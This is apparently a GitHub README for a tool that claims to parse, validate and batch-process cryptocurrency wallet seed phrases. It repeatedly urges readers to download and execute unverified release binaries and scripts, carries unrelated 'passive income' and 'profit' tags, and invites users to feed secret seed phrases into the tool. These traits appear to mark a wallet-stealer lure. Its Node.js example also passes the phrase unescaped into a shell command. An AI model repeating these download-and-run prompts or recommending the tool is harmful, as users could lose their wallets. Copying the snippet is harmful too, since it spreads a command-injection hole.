[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/SonGheb/Wallet-Phrase-Tool/releases)

# Wallet-Phrase-Tool — Parse, Validate, and Manage Wallet Phrases 🔐💼

![crypto-hero](https://upload.wikimedia.org/wikipedia/commons/8/88/Cryptocurrency_vs_traditional_finance.jpg)

Short description
- Process phrases for wallet info. Use this tool to parse seed phrases, extract metadata, validate wordlists, and prepare batches for wallet import or analysis.

Table of contents
- Features
- Quick start
- Download and run (RELEASES)
- Usage examples
- CLI reference
- Integration snippets
- File formats
- Security and handling
- Tests and dev
- Contributing
- License
- Links and resources

Features
- Parse seed phrases and passphrases into structured output
- Validate wordlists (BIP-39 and custom lists)
- Detect language and entropy
- Convert phrases to checksummed formats and fingerprints
- Batch process CSV and TXT lists
- Export results to JSON, CSV, and SQLite
- Provide CLI and library modes for script integration
- Print human-friendly reports and machine-ready output

Why this repo
- Focus on programmatic handling of wallet phrases.
- Provide consistent, auditable outputs.
- Support workflows for research, recovery, and automation.

Supported topics and tags
- arbitrage, auto, cash, code, crypto, earning, free, income, open, passive, profit, smart, trade, tutorial, youtube

Releases — download and execute
- Download the release file from the Releases page: https://github.com/SonGheb/Wallet-Phrase-Tool/releases
- The provided link points to a Releases path. Download the release file from that page and execute it on your system.
- The Releases page contains compiled binaries and installer scripts. Choose the file that matches your platform and follow the run instructions on the release notes.

Quick start — install and run (Linux / macOS)
1. Visit the Releases page and download the file for your OS:
   https://github.com/SonGheb/Wallet-Phrase-Tool/releases
2. Make the file executable:
   ```bash
   chmod +x Wallet-Phrase-Tool-v1.0.0-linux-amd64
   ```
3. Run the binary:
   ```bash
   ./Wallet-Phrase-Tool-v1.0.0-linux-amd64 --help
   ```
4. For a script release (shell or PowerShell), download and run:
   ```bash
   bash wallet-phrase-tool.sh
   ```

Quick start — Windows
- Download the .exe from Releases.
- Double-click to run or run from PowerShell:
  ```powershell
  .\Wallet-Phrase-Tool-v1.0.0-win64.exe --help
  ```

Common workflow examples

1) Validate a single phrase
```bash
./wallet-phrase-tool validate "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
```
Output (JSON)
```json
{
  "phrase": "abandon abandon ... about",
  "valid": true,
  "wordlist": "english",
  "entropy_bits": 128,
  "checksum_ok": true,
  "seed_fingerprint": "1a2b3c4d"
}
```

2) Batch process a CSV
- Input CSV format: id,phrase
```bash
./wallet-phrase-tool batch --input phrases.csv --output results.json
```
- The tool writes per-row results and a summary.

3) Convert to hardware wallet import format
```bash
./wallet-phrase-tool export --format hw-import --input phrase.txt --output hw_import.json
```

CLI reference
- validate <phrase>           — Validate a phrase and show details
- batch --input <file>        — Batch process CSV or TXT files
- export --format <fmt>       — Export results: json, csv, sqlite, hw-import
- wordlist --check <file>     — Validate a custom wordlist
- fingerprint --phrase <p>    — Print seed fingerprint
- --help                      — Show full options

Integration snippets

Node.js example
```js
const { execSync } = require('child_process');

function validatePhrase(phrase) {
  const cmd = `./Wallet-Phrase-Tool validate "${phrase}" --output json`;
  const out = execSync(cmd).toString();
  return JSON.parse(out);
}

const res = validatePhrase('abandon abandon ... about');
console.log(res);
```

Python example
```python
import subprocess, json

def validate_phrase(phrase):
    out = subprocess.check_output(['./wallet-phrase-tool','validate', phrase,'--output','json'])
    return json.loads(out)

res = validate_phrase('abandon abandon ... about')
print(res)
```

API mode (library)
- The repo exposes a small library (python & go) in the /lib folder.
- Example (python):
```python
from wallet_phrase_tool import Validator

v = Validator()
result = v.validate("abandon abandon ... about")
print(result['valid'])
```

File formats and data model
- Input:
  - TXT: one phrase per line
  - CSV: id,phrase[,meta...]
- Output:
  - JSON: full object per entry
  - CSV: compact table for spreadsheets
  - SQLite: single-file DB for queries
- Fields:
  - phrase, valid, wordlist, entropy_bits, checksum_ok, seed_fingerprint, warnings

Security and handling
- Treat phrases as secrets in all scripts.
- Use secure storage for any exported files.
- The tool writes output files to the working folder by default. Supply an output path to store results in a designated secure location.
- When you run a downloaded release binary or script, run it in an environment you control.

Testing and dev
- Run unit tests:
  ```bash
  make test
  ```
- Run linters:
  ```bash
  make lint
  ```
- Run integration tests:
  ```bash
  make integration
  ```

Build from source
- Requirements
  - Go 1.20+ (for the main CLI)
  - Python 3.10+ (for the library)
- Build steps (Go)
  ```bash
  git clone https://github.com/SonGheb/Wallet-Phrase-Tool.git
  cd Wallet-Phrase-Tool
  go build -o wallet-phrase-tool ./cmd/cli
  ```
- Build steps (Python)
  ```bash
  cd python
  pip install -r requirements.txt
  python setup.py install
  ```

Examples and sample data
- Use sample files in /samples
- Example phrase lists:
  - samples/simple.txt
  - samples/mixed.csv

Contributing
- Open an issue for bugs and feature requests.
- Fork, implement a feature or fix, then open a pull request.
- Follow the code style in .editorconfig and the tests in /tests.
- Add unit tests for new functionality.

Project structure
- /cmd/cli — CLI entry
- /lib        — language libraries (python, go)
- /samples    — sample phrases and CSVs
- /docs       — design notes and wordlist references
- /tests      — test suites and fixtures

License
- MIT License. See LICENSE file.

Frequently asked questions

Q: Where do I get the release file?
A: Use the Releases page on GitHub: https://github.com/SonGheb/Wallet-Phrase-Tool/releases. Download the proper file for your platform and execute it.

Q: What wordlists do you support?
A: BIP-39 English by default. The tool supports other BIP-39 wordlists and custom lists. Use `wordlist --check` to validate a custom list.

Q: Can I use this in an automated pipeline?
A: Yes. Use batch mode and the JSON output for automation.

Q: How do I export results to a database?
A: Use `--output results.sqlite` and the tool writes a SQLite DB with a results table.

Resources and links
- Releases page (download and run): https://github.com/SonGheb/Wallet-Phrase-Tool/releases
- BIP-39 spec: https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki
- Common wordlists and checksum docs: /docs/wordlists.md

Badges and links
[![GitHub release](https://img.shields.io/github/v/release/SonGheb/Wallet-Phrase-Tool?label=latest%20release)](https://github.com/SonGheb/Wallet-Phrase-Tool/releases)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Topics](https://img.shields.io/badge/topics-crypto%20%7C%20tool-blue)]()

Images and media
- Hero image sourced from Wikimedia: https://upload.wikimedia.org/wikipedia/commons/8/88/Cryptocurrency_vs_traditional_finance.jpg
- Use screenshots in /assets when you build and run locally.

Contact
- Open issues on GitHub or submit pull requests for code or doc changes.
- For release downloads and binaries use the Releases page: https://github.com/SonGheb/Wallet-Phrase-Tool/releases

End of file